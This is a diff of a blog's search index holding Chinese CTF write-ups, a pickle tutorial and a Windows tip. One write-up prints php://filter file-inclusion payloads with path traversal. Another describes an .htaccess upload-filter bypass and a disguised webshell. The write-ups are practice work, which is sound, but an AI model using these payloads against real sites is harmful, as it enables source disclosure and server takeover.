@@ -1,6 +1,49 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>BSidesCF 2020 Had a bad day</title>
+    <url>/2022/03/29/BSidesCF%202020%20Had%20a%20bad%20day/</url>
+    <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
+<span id="more"></span>
+<h1 id="题目信息">题目信息</h1>
+<p>进入环境之后，页面有两个选择</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329133629.png" /></p>
+<p>这时候选哪个都会跳出对应的图片（狗或者猫），并且 url 出现变化</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://6bea1108-6e3e-4c6b-9295-bf25d2c8e728.node4.buuoj.cn:81/index.php?category=meowers</span><br></pre></td></tr></table></figure>
+<p>此时打开源码发现：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329133835.png" /></p>
+<p>每刷新一次这个红框里的图片都会变化，因此，可能存在文件包含。</p>
+<h1 id="解题">解题</h1>
+<p>尝试看一下报错有没有信息，发现输入任何东西都只会提示：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Sorry, we currently only support woofers and meowers.</span><br></pre></td></tr></table></figure>
+<p>可是这并不算报错，因此，尝试一下 <code>?category=meowers.php</code>，此时发现报错了！</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329134329.png" /></p>
+<p>此时，可以确定本题是文件包含，函数为 <code>include()</code>。</p>
+<p>利用伪协议 <code>php://filter</code> 尝试读取一下 <code>index.php</code> ，payload 如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?category=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure></p>
+<p>发现报错了，报错信息为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Warning: include(php://filter/read=convert.base64-encode/resource=index.php.php): failed to open stream: operation failed in /var/www/html/index.php on line 37</span><br></pre></td></tr></table></figure></p>
+<p>注意文件名后有两个php，猜测后台在我们传入的参数后面加上了 <code>.php</code>，因此构造如下payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?category=php://filter/read=convert.base64-encode/resource=index</span><br></pre></td></tr></table></figure></p>
+<p>成功读取源码，base64解码后，将重要内容整理如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;category&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">	<span class="keyword">if</span>( strpos( <span class="variable">$file</span>, <span class="string">&quot;woofers&quot;</span> ) !==  <span class="literal">false</span> || strpos( <span class="variable">$file</span>, <span class="string">&quot;meowers&quot;</span> ) !==  <span class="literal">false</span> || strpos( <span class="variable">$file</span>, <span class="string">&quot;index&quot;</span>))&#123;</span><br><span class="line">		<span class="keyword">include</span> (<span class="variable">$file</span> . <span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;Sorry, we currently only support woofers and meowers.&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>通过代码审计知道：</p>
+<ol type="1">
+<li>需要传入参数 category</li>
+<li>category 需要包含 <code>woofers</code>， <code>meowers</code>， <code>index</code> 三者之一</li>
+<li>我们传入的文件名不需要包含 .php</li>
+</ol>
+<p>假设我们读取的是 <code>flag</code>，那么我们就要带上上述的第二点的其中一个，这就是本题的难点，有两种payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. ?category=php://filter/read=convert.base64-encode/resource=index/../flag</span><br><span class="line">2. ?category=php://filter/read=convert.base64-encode/index/resource=flag</span><br></pre></td></tr></table></figure></p>
+<p>两者都能得到结果（第二个payload就是 <code>php://filter</code> 伪协议嵌套），但是如果使用第二种，会出现报错信息：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329201529.png" /></p>
+<p>这里不是很懂，不过根据结果可以猜测，<code>index</code> 的位置上应该放的是 filter 这个伪协议的选项，而index并不是，所以这里报错了，但是这并不影响整体的执行。</p>
+<h1 id="总结">总结</h1>
+<p>通过本题可以学到： <code>php://filter</code> 伪协议的嵌套。</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>PHP伪协议</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>BJDCTF2020 Mark loves cat</title>
     <url>/2022/03/30/BJDCTF2020%20Mark%20loves%20cat/</url>
     <content><![CDATA[<p>BUUCTF 网址：<a href="https://buuoj.cn/challenges">https://buuoj.cn/challenges</a></p>
@@ -74,49 +117,6 @@
       </categories>
       <tags>
         <tag>SSTI</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>BSidesCF 2020 Had a bad day</title>
-    <url>/2022/03/29/BSidesCF%202020%20Had%20a%20bad%20day/</url>
-    <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
-<span id="more"></span>
-<h1 id="题目信息">题目信息</h1>
-<p>进入环境之后，页面有两个选择</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329133629.png" /></p>
-<p>这时候选哪个都会跳出对应的图片（狗或者猫），并且 url 出现变化</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://6bea1108-6e3e-4c6b-9295-bf25d2c8e728.node4.buuoj.cn:81/index.php?category=meowers</span><br></pre></td></tr></table></figure>
-<p>此时打开源码发现：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329133835.png" /></p>
-<p>每刷新一次这个红框里的图片都会变化，因此，可能存在文件包含。</p>
-<h1 id="解题">解题</h1>
-<p>尝试看一下报错有没有信息，发现输入任何东西都只会提示：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Sorry, we currently only support woofers and meowers.</span><br></pre></td></tr></table></figure>
-<p>可是这并不算报错，因此，尝试一下 <code>?category=meowers.php</code>，此时发现报错了！</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329134329.png" /></p>
-<p>此时，可以确定本题是文件包含，函数为 <code>include()</code>。</p>
-<p>利用伪协议 <code>php://filter</code> 尝试读取一下 <code>index.php</code> ，payload 如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?category=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure></p>
-<p>发现报错了，报错信息为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Warning: include(php://filter/read=convert.base64-encode/resource=index.php.php): failed to open stream: operation failed in /var/www/html/index.php on line 37</span><br></pre></td></tr></table></figure></p>
-<p>注意文件名后有两个php，猜测后台在我们传入的参数后面加上了 <code>.php</code>，因此构造如下payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?category=php://filter/read=convert.base64-encode/resource=index</span><br></pre></td></tr></table></figure></p>
-<p>成功读取源码，base64解码后，将重要内容整理如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;category&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">	<span class="keyword">if</span>( strpos( <span class="variable">$file</span>, <span class="string">&quot;woofers&quot;</span> ) !==  <span class="literal">false</span> || strpos( <span class="variable">$file</span>, <span class="string">&quot;meowers&quot;</span> ) !==  <span class="literal">false</span> || strpos( <span class="variable">$file</span>, <span class="string">&quot;index&quot;</span>))&#123;</span><br><span class="line">		<span class="keyword">include</span> (<span class="variable">$file</span> . <span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;Sorry, we currently only support woofers and meowers.&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>通过代码审计知道：</p>
-<ol type="1">
-<li>需要传入参数 category</li>
-<li>category 需要包含 <code>woofers</code>， <code>meowers</code>， <code>index</code> 三者之一</li>
-<li>我们传入的文件名不需要包含 .php</li>
-</ol>
-<p>假设我们读取的是 <code>flag</code>，那么我们就要带上上述的第二点的其中一个，这就是本题的难点，有两种payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. ?category=php://filter/read=convert.base64-encode/resource=index/../flag</span><br><span class="line">2. ?category=php://filter/read=convert.base64-encode/index/resource=flag</span><br></pre></td></tr></table></figure></p>
-<p>两者都能得到结果（第二个payload就是 <code>php://filter</code> 伪协议嵌套），但是如果使用第二种，会出现报错信息：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329201529.png" /></p>
-<p>这里不是很懂，不过根据结果可以猜测，<code>index</code> 的位置上应该放的是 filter 这个伪协议的选项，而index并不是，所以这里报错了，但是这并不影响整体的执行。</p>
-<h1 id="总结">总结</h1>
-<p>通过本题可以学到： <code>php://filter</code> 伪协议的嵌套。</p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>PHP伪协议</tag>
       </tags>
   </entry>
   <entry>
@@ -200,6 +200,44 @@
       </tags>
   </entry>
   <entry>
+    <title>GXYCTF2019 BabyUpload</title>
+    <url>/2022/03/21/GXYCTF2019%20BabyUpload/</url>
+    <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
+<span id="more"></span>
+<h1 id="题目信息">题目信息</h1>
+<p>打开环境可以很明显看到，这就是一个文件上传的题目。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321194818.png" /></p>
+<h1 id="过滤测试">过滤测试</h1>
+<h2 id="过滤类型测试">过滤类型测试</h2>
+<p>随便上传一个图片 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321195148.png" /></p>
+<p>根据提示 <code>上传类型</code> 推测应该需要修改 <code>Content-Type</code>，尝试 <code>image/gif</code> 和 <code>imag/jpeg</code> 后，发现后者是可以的。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321195315.png" /></p>
+<h2 id="过滤后缀测试">过滤后缀测试</h2>
+<p>将后缀修改为 <code>php</code> ，上传 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321195444.png" /></p>
+<p>经过多次尝试，发现我无法绕过这个过滤。此时思考，是否可以不用特定后缀又可以上传文件，想到了 <code>.htaccess</code> 。尝试一下发现成功！ <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321195835.png" /></p>
+<p>记录一下地址 <code>/var/www/html/upload/0ac6e66ec314df83922a1ebbbdf6e358/.htaccess</code>。之后，只要上传一个文件名为 <code>shell.jpg</code> 的木马即可。</p>
+<h2 id="文件内容过滤">文件内容过滤</h2>
+<p>写入一句话木马，然后上传，果不其然被过滤了。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321200100.png" /></p>
+<p>换一种写法发现还是不行 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321200308.png" /></p>
+<p>猜测过滤的应该是开头的那个 <code>php</code> 。因此，换一种写法，成功绕过。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321200502.png" /></p>
+<p>记录上传地址：<code>/var/www/html/upload/0ac6e66ec314df83922a1ebbbdf6e358/shell.jpg</code></p>
+<h1 id="蚁剑连接get-flag">蚁剑连接get flag</h1>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321200538.png" /></p>
+<p>flag在根目录 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321200555.png" /></p>
+<p>成功。</p>
+<h1 id="总结">总结</h1>
+<ol type="1">
+<li>要熟悉常用的上传类型，题目中大多考察的是图片，因此要熟记：<code>image/jpeg</code>、<code>image/png</code>、<code>image/gif</code>；</li>
+<li>当脚本后缀被过滤之后，并且无法绕过时，需要想到 <code>.htaccess</code>；</li>
+<li>文件内容的过滤，需要知道多种木马的写法。</li>
+</ol>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>文件上传</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>GWCTF 2019 我有一个数据库</title>
     <url>/2022/03/24/GWCTF%202019%20%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
     <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
@@ -239,44 +277,6 @@
       <tags>
         <tag>phpmyadmin 漏洞</tag>
         <tag>CVE-2018-12613</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>GXYCTF2019 BabyUpload</title>
-    <url>/2022/03/21/GXYCTF2019%20BabyUpload/</url>
-    <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
-<span id="more"></span>
-<h1 id="题目信息">题目信息</h1>
-<p>打开环境可以很明显看到，这就是一个文件上传的题目。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321194818.png" /></p>
-<h1 id="过滤测试">过滤测试</h1>
-<h2 id="过滤类型测试">过滤类型测试</h2>
-<p>随便上传一个图片 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321195148.png" /></p>
-<p>根据提示 <code>上传类型</code> 推测应该需要修改 <code>Content-Type</code>，尝试 <code>image/gif</code> 和 <code>imag/jpeg</code> 后，发现后者是可以的。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321195315.png" /></p>
-<h2 id="过滤后缀测试">过滤后缀测试</h2>
-<p>将后缀修改为 <code>php</code> ，上传 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321195444.png" /></p>
-<p>经过多次尝试，发现我无法绕过这个过滤。此时思考，是否可以不用特定后缀又可以上传文件，想到了 <code>.htaccess</code> 。尝试一下发现成功！ <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321195835.png" /></p>
-<p>记录一下地址 <code>/var/www/html/upload/0ac6e66ec314df83922a1ebbbdf6e358/.htaccess</code>。之后，只要上传一个文件名为 <code>shell.jpg</code> 的木马即可。</p>
-<h2 id="文件内容过滤">文件内容过滤</h2>
-<p>写入一句话木马，然后上传，果不其然被过滤了。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321200100.png" /></p>
-<p>换一种写法发现还是不行 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321200308.png" /></p>
-<p>猜测过滤的应该是开头的那个 <code>php</code> 。因此，换一种写法，成功绕过。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321200502.png" /></p>
-<p>记录上传地址：<code>/var/www/html/upload/0ac6e66ec314df83922a1ebbbdf6e358/shell.jpg</code></p>
-<h1 id="蚁剑连接get-flag">蚁剑连接get flag</h1>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321200538.png" /></p>
-<p>flag在根目录 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321200555.png" /></p>
-<p>成功。</p>
-<h1 id="总结">总结</h1>
-<ol type="1">
-<li>要熟悉常用的上传类型，题目中大多考察的是图片，因此要熟记：<code>image/jpeg</code>、<code>image/png</code>、<code>image/gif</code>；</li>
-<li>当脚本后缀被过滤之后，并且无法绕过时，需要想到 <code>.htaccess</code>；</li>
-<li>文件内容的过滤，需要知道多种木马的写法。</li>
-</ol>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>文件上传</tag>
       </tags>
   </entry>
   <entry>
@@ -382,55 +382,6 @@
         <tag>PHP</tag>
         <tag>git泄露</tag>
         <tag>RCE</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>pickle 库</title>
-    <url>/2022/01/30/pickle%20%E5%BA%93/</url>
-    <content><![CDATA[<p>pickle 库的简单使用。</p>
-<span id="more"></span>
-<h1 id="前言">前言</h1>
-<p>官方文档：<a href="https://docs.python.org/zh-cn/3/library/pickle.html">pickle</a></p>
-<h1 id="介绍">介绍</h1>
-<p>模块 pickle 实现了对一个 Python 对象结构的二进制序列化和反序列化。</p>
-<h1 id="常用方法">常用方法</h1>
-<p>主要由两类接口，即序列化和反序列化。</p>
-<p>其中序列化包括： 1. dump() 2. dumps()</p>
-<p>反序列化包括： 1. load() 2. loads()</p>
-<p><strong>序列化后的对象是 bytes 类型的，反序列后的对象同样也是 bytes 类型的，也就是二进制文件。</strong></p>
-<h2 id="dump">dump</h2>
-<p>语法： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pickle.dump(obj, file, protocol=<span class="literal">None</span>, *, fiximports=<span class="literal">True</span>, buffer_callback=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure></p>
-<blockquote>
-<p>将对象 obj 序列化以后的对象写入已打开的 file object file。</p>
-</blockquote>
-<p>参数： 主要参数就是前两个： - obj：要序列化的对象 - file：序列化完之后的对象需要写入到 file 中。</p>
-<p>例子： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line">tar = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;lihua&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">30</span>&#125;  </span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;pickle使用的文件/after.p&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">    pickle.dump(tar, f)</span><br></pre></td></tr></table></figure></p>
-<h2 id="dumps">dumps</h2>
-<p>语法： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pickle.dump(obj, protocol=<span class="literal">None</span>, *, fiximports=<span class="literal">True</span>, buffer_callback=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure></p>
-<p>参数： - obj：要序列化的对象 - 少了 file</p>
-<ul>
-<li>返回值 <strong>直接返回序列化后的二进制对象。（这是与 dump 最大的区别）</strong></li>
-</ul>
-<p>例子： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line">tar = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;lihua&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">30</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(pickle.dumps(tar))</span><br></pre></td></tr></table></figure></p>
-<p>结果： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&#x27;\x80\x04\x95\x1c\x00\x00\x00\x00\x00\x00\x00&#125;\x94(\x8c\x04name\x94\x8c\x05lihua\x94\x8c\x03age\x94K\x1eu.&#x27;</span><br></pre></td></tr></table></figure></p>
-<h2 id="load">load</h2>
-<p>语法： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pickle.load(file, *, protocol=<span class="literal">None</span>, fiximports=<span class="literal">True</span>, encoding=<span class="string">&#x27;ASCII&#x27;</span>, errors=<span class="string">&#x27;strict&#x27;</span>, buffers=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure></p>
-<p>参数： - file：要反序列的<strong>二进制文件</strong></p>
-<p>例子： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;pickle使用的文件/after.p&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">    <span class="built_in">print</span>(pickle.load(f))</span><br></pre></td></tr></table></figure></p>
-<p>利用上面的 dump 的序列化后的二进制文件做演示，得到结果： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#x27;name&#x27;: &#x27;lihua&#x27;, &#x27;age&#x27;: 30&#125;</span><br></pre></td></tr></table></figure></p>
-<h2 id="loads">loads</h2>
-<p>语法： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pickle.loads(data, /, *, fix_imports=<span class="literal">True</span>, encoding=<span class="string">&quot;ASCII&quot;</span>, errors=<span class="string">&quot;strict&quot;</span>, buffers=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure></p>
-<p>参数： - data：需要反序列化的<strong>二进制对象</strong></p>
-<p>返回值： <strong>直接返回反序列化后的对象。（这是与 load 的最大区别）</strong></p>
-<p>例子： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line">tar = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;lihua&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">30</span>&#125;</span><br><span class="line">tars = pickle.dumps(tar)  <span class="comment"># 先序列化</span></span><br><span class="line"><span class="built_in">print</span>(pickle.loads(tars)) <span class="comment"># 再反序列化</span></span><br></pre></td></tr></table></figure></p>
-<p>结果： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#x27;name&#x27;: &#x27;lihua&#x27;, &#x27;age&#x27;: 30&#125;</span><br></pre></td></tr></table></figure></p>
-]]></content>
-      <categories>
-        <category>python</category>
-      </categories>
-      <tags>
-        <tag>python</tag>
-        <tag>pickle</tag>
       </tags>
   </entry>
   <entry>
@@ -687,32 +638,52 @@
       </tags>
   </entry>
   <entry>
-    <title>windows 上CD驱动器的删除问题</title>
-    <url>/2022/03/28/windows%20%E4%B8%8ACD%E9%A9%B1%E5%8A%A8%E5%99%A8%E7%9A%84%E5%88%A0%E9%99%A4%E9%97%AE%E9%A2%98/</url>
-    <content><![CDATA[<p>个人日常生活中遇到的繁琐的小问题的解决。</p>
+    <title>pickle 库</title>
+    <url>/2022/01/30/pickle%20%E5%BA%93/</url>
+    <content><![CDATA[<p>pickle 库的简单使用。</p>
 <span id="more"></span>
-<h1 id="问题描述">问题描述</h1>
-<p>有时候，电脑上总会莫名其妙的安装了如下 CD驱动器：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220328224202.png" /></p>
-<p>删除也删不掉，打开也打开不了，很烦。</p>
-<h1 id="原因">原因</h1>
-<p>CD驱动器计算机-设备和驱动器分类下的计算机光驱管理，可加载ISO文件，多在计算机安装<code>UltraISO</code>软碟通等虚拟光驱软件后自动在我的电脑下创建CD驱动器图标。</p>
-<p>知道原因后，解决的办法就很简单了。</p>
-<h1 id="问题解决">问题解决</h1>
-<p>首先，以管理员方式打开 <code>UltraISO</code></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220328224452.png" /></p>
-<p><code>选项 -&gt; 配置</code></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220328224557.png" /></p>
-<p>然后 <code>虚拟光驱</code>，<strong>将设备数量改为无</strong></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220328224629.png" /></p>
-<p>然后即可看到 CD驱动器已经消失了。</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220328224711.png" /></p>
+<h1 id="前言">前言</h1>
+<p>官方文档：<a href="https://docs.python.org/zh-cn/3/library/pickle.html">pickle</a></p>
+<h1 id="介绍">介绍</h1>
+<p>模块 pickle 实现了对一个 Python 对象结构的二进制序列化和反序列化。</p>
+<h1 id="常用方法">常用方法</h1>
+<p>主要由两类接口，即序列化和反序列化。</p>
+<p>其中序列化包括： 1. dump() 2. dumps()</p>
+<p>反序列化包括： 1. load() 2. loads()</p>
+<p><strong>序列化后的对象是 bytes 类型的，反序列后的对象同样也是 bytes 类型的，也就是二进制文件。</strong></p>
+<h2 id="dump">dump</h2>
+<p>语法： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pickle.dump(obj, file, protocol=<span class="literal">None</span>, *, fiximports=<span class="literal">True</span>, buffer_callback=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure></p>
+<blockquote>
+<p>将对象 obj 序列化以后的对象写入已打开的 file object file。</p>
+</blockquote>
+<p>参数： 主要参数就是前两个： - obj：要序列化的对象 - file：序列化完之后的对象需要写入到 file 中。</p>
+<p>例子： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line">tar = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;lihua&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">30</span>&#125;  </span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;pickle使用的文件/after.p&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">    pickle.dump(tar, f)</span><br></pre></td></tr></table></figure></p>
+<h2 id="dumps">dumps</h2>
+<p>语法： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pickle.dump(obj, protocol=<span class="literal">None</span>, *, fiximports=<span class="literal">True</span>, buffer_callback=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure></p>
+<p>参数： - obj：要序列化的对象 - 少了 file</p>
+<ul>
+<li>返回值 <strong>直接返回序列化后的二进制对象。（这是与 dump 最大的区别）</strong></li>
+</ul>
+<p>例子： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line">tar = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;lihua&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">30</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(pickle.dumps(tar))</span><br></pre></td></tr></table></figure></p>
+<p>结果： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&#x27;\x80\x04\x95\x1c\x00\x00\x00\x00\x00\x00\x00&#125;\x94(\x8c\x04name\x94\x8c\x05lihua\x94\x8c\x03age\x94K\x1eu.&#x27;</span><br></pre></td></tr></table></figure></p>
+<h2 id="load">load</h2>
+<p>语法： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pickle.load(file, *, protocol=<span class="literal">None</span>, fiximports=<span class="literal">True</span>, encoding=<span class="string">&#x27;ASCII&#x27;</span>, errors=<span class="string">&#x27;strict&#x27;</span>, buffers=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure></p>
+<p>参数： - file：要反序列的<strong>二进制文件</strong></p>
+<p>例子： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;pickle使用的文件/after.p&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">    <span class="built_in">print</span>(pickle.load(f))</span><br></pre></td></tr></table></figure></p>
+<p>利用上面的 dump 的序列化后的二进制文件做演示，得到结果： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#x27;name&#x27;: &#x27;lihua&#x27;, &#x27;age&#x27;: 30&#125;</span><br></pre></td></tr></table></figure></p>
+<h2 id="loads">loads</h2>
+<p>语法： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pickle.loads(data, /, *, fix_imports=<span class="literal">True</span>, encoding=<span class="string">&quot;ASCII&quot;</span>, errors=<span class="string">&quot;strict&quot;</span>, buffers=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure></p>
+<p>参数： - data：需要反序列化的<strong>二进制对象</strong></p>
+<p>返回值： <strong>直接返回反序列化后的对象。（这是与 load 的最大区别）</strong></p>
+<p>例子： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line">tar = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;lihua&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">30</span>&#125;</span><br><span class="line">tars = pickle.dumps(tar)  <span class="comment"># 先序列化</span></span><br><span class="line"><span class="built_in">print</span>(pickle.loads(tars)) <span class="comment"># 再反序列化</span></span><br></pre></td></tr></table></figure></p>
+<p>结果： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#x27;name&#x27;: &#x27;lihua&#x27;, &#x27;age&#x27;: 30&#125;</span><br></pre></td></tr></table></figure></p>
 ]]></content>
       <categories>
-        <category>Windows</category>
+        <category>python</category>
       </categories>
       <tags>
-        <tag>Windows小知识</tag>
+        <tag>python</tag>
+        <tag>pickle</tag>
       </tags>
   </entry>
   <entry>
@@ -1091,37 +1062,32 @@
       </tags>
   </entry>
   <entry>
-    <title>复现：Apache HTTPD 换行解析漏洞（CVE-2017-15715）</title>
-    <url>/2022/03/21/%E5%A4%8D%E7%8E%B0%EF%BC%9AApache%20HTTPD%20%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-15715%EF%BC%89/</url>
-    <content><![CDATA[<p>个人的漏洞复现练习，请多批评！</p>
+    <title>windows 上CD驱动器的删除问题</title>
